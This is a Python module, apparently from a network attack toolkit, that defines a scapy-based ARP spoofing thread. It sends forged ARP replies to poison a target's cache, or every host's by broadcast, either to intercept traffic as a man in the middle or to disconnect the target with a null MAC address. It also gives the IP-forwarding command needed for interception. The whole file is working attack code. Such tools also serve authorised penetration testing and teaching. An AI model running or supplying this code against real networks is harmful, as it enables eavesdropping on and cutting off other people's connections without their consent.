import threading
from scapy.all import *
import time

from src.log import log

class ARP_Spoofer(threading.Thread):
    """Thread of the ARP Spoofing module.
    
    Sends ARP packets to a target in order to poison its cache. This way a
    MiTM attack can be performed, or the target can be disconnected.
    
    IP Forwarding needed:
        echo 1 > /proc/sys/net/ipv4/ip_forward
    """
    
    def __init__(self, exit_event, target, gateway, timeout, interval, disconnect):
        """Creates the thread.
        
        Parameters:
            exit_event (threading.Event): the event that will be checked to
                finish the thread and so the ARP Spoofing attack.
            target (str): the IP address of the target. ARP packets will be
                sent to this IP. Optional 'everyone' string can be passed, and
                every device in the net will be targetted.
            gateway (str): the IP address of the gateway.
            timeout (int, None): the time in seconds of the duration of the
                attack. If None, it will last until CTRL-C is pressed.
            interval (int): time in seconds between each ARP packet is sent.
                Recommended value: 2.
            disconnect (bool): if set to True, MiTM attack won't be performed
                and the target will not have connection.
            As a Thread, it can also have any of a thread parameters. See
            help(threading.Thread) for more help.
        """
        
        super().__init__()
        self.exit_event = exit_event
        self.target = target
        self.gateway = gateway
        self.interval = interval
        self.timeout = timeout
        self.disconnect = disconnect
    
    
    def _make_packet(self):
        """Makes the ARP packet according to the constructor parameters.
        
        Returns:
            scapy.packet.Packet: ARP packet that will be sent to perform the
                ARP Spoofing attack.
        """
        
        #single objective: ARP(pdst=self.target, psrc=self.gateway)
        #single objective dc: ARP(pdst=self.target, psrc=self.gateway, hwsrc="00:00:00:00:00:00")
        #all: Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc=self.gateway)
        #all dc: Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc=self.gateway, hwsrc="00:00:00:00:00:00")
        
        if self.target == "everyone":
            log.arps.warning("target_everyone")
            if self.disconnect: p = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc=self.gateway, hwsrc="00:00:00:00:00:00")
            else:               p = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, psrc=self.gateway)
        else:
            if self.disconnect: p = ARP(pdst=self.target, psrc=self.gateway, hwdst=getmacbyip(self.target), hwsrc="00:00:00:00:00:00")
            else:               p = ARP(pdst=self.target, psrc=self.gateway, hwdst=getmacbyip(self.target))
        
        return p
    
    
    def run(self):
        """Method representing the thread's activity. It is started when start
        function is called.
        
        Sends continuosly ARP packets to the target.
        """
        
        log.arps.info("start", target=self.target, interval=self.interval, timeout=self.timeout, disconnect=str(self.disconnect))
    
        a = self._make_packet()
        
        if a.haslayer("Ether"): my_send = sendp
        else:                   my_send = send
            
        if self.timeout:
            resting_timeout = self.timeout
            while resting_timeout > 0 and not self.exit_event.is_set():
                my_send(a, inter=self.interval, count=1, verbose=0)
                resting_timeout -= self.interval
        else:
            while not self.exit_event.is_set():
                my_send(a, inter=self.interval, count=1, verbose=0)
        
        log.arps.info("finish", target=self.target, gateway=self.gateway, disconnect=self.disconnect)
        
